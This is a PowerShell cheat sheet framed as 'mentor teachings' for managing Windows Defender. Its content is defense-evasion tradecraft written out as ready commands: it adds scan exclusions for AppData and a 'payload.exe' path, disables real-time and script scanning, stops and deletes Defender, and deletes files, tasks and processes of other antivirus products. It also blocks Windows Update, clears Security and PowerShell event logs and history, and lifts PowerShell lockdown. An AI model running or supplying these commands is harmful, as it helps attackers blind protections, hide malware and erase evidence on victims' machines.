# Windows Defender Management — Mentor Reference Document
# Source: mentor teachings
# Classification: AUTHORIZED RESEARCH ONLY

---

## Exclusions Management

### Check Exclusions
```powershell
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
(Get-MpPreference).ExclusionPath -contains $env:APPDATA
Get-MpPreference | Select-Object ExclusionPath, ExclusionProcess, ExclusionExtension
```

### Add Exclusions
```powershell
Add-MpPreference -ExclusionPath "$env:APPDATA"
Add-MpPreference -ExclusionPath "C:\ProgramData"
Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
Add-MpPreference -ExclusionPath "C:\Users\asi\AppData\Roaming\payload.exe"
Add-MpPreference -ExclusionPath "C:\Users\singh\AppData\Roaming"
Add-MpPreference -ExclusionExtension ".bat"
Add-MpPreference -ExclusionExtension ".exe"
Add-MpPreference -ExclusionProcess "powershell.exe"
```

### Check Removed Threats
```powershell
Get-MpThreat | Sort-Object LastDetectedTime -Descending
Get-MpThreatDetection | Sort-Object InitialDetectionTime -Descending | Select-Object ThreatName, Resources, InitialDetectionTime
Get-MpThreatDetection | Sort-Object -Property InitialDetectionTime -Descending | Select-Object -First 10
```

---

## Disable Windows Defender

### Via PowerShell Preferences
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisablePrivacyMode $true
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableScriptScanning $true
```

### Via Registry
```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWORD
```

### Via Service Control
```powershell
Stop-Service -Name "WinDefend" -Force
Set-Service -Name "WinDefend" -StartupType Disabled
```

### Destructive: Delete Windows Defender
```powershell
Takeown /f "C:\Program Files\Windows Defender" /r /d y
icacls "C:\Program Files\Windows Defender" /grant administrators:F /t
Remove-Item "C:\Program Files\Windows Defender" -Recurse -Force
```

### Delete Windows Defender Files (With Confirmation)
```powershell
$FilesToDelete = Get-ChildItem -Path $env:ProgramFiles, $env:ProgramData, ${env:ProgramFiles(x86)} -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.FullName -like "*Windows Defender*" }
if ($FilesToDelete.Count -gt 0) {
    Write-Host "Found the following files/dirs to delete:" -ForegroundColor Red
    $FilesToDelete.FullName
    $Confirm = Read-Host "Continue? (y/N)"
    if ($Confirm -eq 'y') {
        $FilesToDelete | Remove-Item -Force -Recurse -Verbose
    }
} else {
    Write-Host "No matching files found." -ForegroundColor Green
}
```

### Delete Other AV Files
```powershell
Get-ChildItem -Path $env:ProgramFiles, $env:ProgramData, ${env:ProgramFiles(x86)} -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "Defender|Symantec|McAfee|Kaspersky|Avast|AVG|Trend|Sophos|Bitdefender|ESET|Norton" } | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
```

---

## Prevent Windows Defender Updates

### Stop Windows Update Service
```powershell
Stop-Service wuauserv -Force
Set-Service wuauserv -StartupType Disabled
Remove-Item -Recurse -Force "C:\Windows\SoftwareDistribution\Download\*"
```

### Delete Windows Update Tasks
```powershell
schtasks /Delete /TN "Microsoft\Windows\WindowsUpdate\Scheduled Start" /F
schtasks /Delete /TN "Microsoft\Windows\WindowsUpdate\sih" /F
schtasks /Delete /TN "Microsoft\Windows\WindowsUpdate\sihboot" /F
```

### Disable Windows Update via Registry
```powershell
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name NoAutoUpdate -PropertyType DWord -Value 1 -Force
```

### Block Windows Update via Firewall
```powershell
New-NetFirewallRule -DisplayName "Block Windows Update" -Direction Outbound -RemoteAddress 20.190.128.0/18,40.126.0.0/18 -Action Block
```

### Verify Windows Update Status
```powershell
Get-Service wuauserv
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"
```

---

## Defender Tasks Management

### List All PS/VBS/BAT Tasks
```powershell
schtasks /query /fo LIST /v | Select-String -Pattern "\.ps1|\.bat|\.vbs"
schtasks /query /fo CSV /nh | ConvertFrom-Csv | Select TaskName
```

### Delete All PS/VBS/BAT Tasks
```powershell
schtasks /query /fo LIST /v | Select-String "TaskName|Task To Run" -Context 0,1 | Where-Object { $_.ToString() -match "TaskName" -and $_.Context.PostContext[0] -match '\.ps1|\.bat|\.vbs' } | ForEach-Object { ($_.ToString() -split ":",2)[1].Trim() } | ForEach-Object { schtasks /delete /tn $_ /f }
schtasks /query /fo CSV /nh | ConvertFrom-Csv | Where-Object { $_.TaskToRun -match '\.ps1|\.bat|\.vbs' } | ForEach-Object { schtasks /delete /tn $_.TaskName /f }
```

### Delete All Tasks (DANGEROUS)
```powershell
schtasks /query /fo LIST /v | Select-String "TaskName" | ForEach-Object { ($_.ToString() -split ":",2)[1].Trim() } | ForEach-Object { schtasks /delete /tn $_ /f }
```

### Delete Only Defender Tasks
```powershell
schtasks /query /fo LIST /v | Select-String "TaskName" | ForEach-Object { ($_.ToString() -split ":",2)[1].Trim() } | Where-Object { $_ -like "\Microsoft\Windows\Windows Defender\*" } | ForEach-Object { schtasks /delete /tn $_ /f }
```

### Delete Other AV Tasks
```powershell
schtasks /query /fo LIST /v | Select-String "TaskName" | ForEach-Object { ($_.ToString() -split ":",2)[1].Trim() } | Where-Object { $_ -match "Windows Defender|Defender|Symantec|McAfee|Kaspersky|Avast|AVG|Trend|Sophos|Bitdefender|ESET" } | ForEach-Object { schtasks /delete /tn $_ /f }
```

---

## Check Defender Status

### Check Defender State
```powershell
Get-MpPreference | Select -ExpandProperty DisableRealtimeMonitoring
Get-MpComputerStatus | Select-Object AMRunningMode, RealTimeProtectionEnabled, AntivirusEnabled, NISEnabled, SignatureUpdateDateTime
```

### Show Installed AV
```powershell
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object displayName, pathToSignedProductExe, productState
```

### Kill AV Processes
```powershell
Get-Process | Where-Object { $_.Name -like '*avast*' } | Stop-Process -Force
```

---

## Cleanup and History

### Clear Event Viewer Logs
```powershell
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
wevtutil cl "Security"
wevtutil cl "System"
wevtutil cl "Application"
```

### Clear PowerShell History
```powershell
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
```

### Kill All Other PowerShell Processes
```powershell
$id = $PID
Get-Process powershell | Where-Object { $_.Id -ne $id } | ForEach-Object { try { $_.Kill() } catch {} }
```

---

## PowerShell Unrestricted Mode

Unlocks full unrestricted PowerShell behavior and blocks logging:
```powershell
Set-ExecutionPolicy Unrestricted -Scope Process -Force
[System.Management.Automation.Utils]::CachePowerShellAssembly()
$env:__PSLockdownPolicy=8
$ExecutionContext.SessionState.LanguageMode = "FullLanguage"
```

---

*VIDIMUS OMNIA — We see everything.*
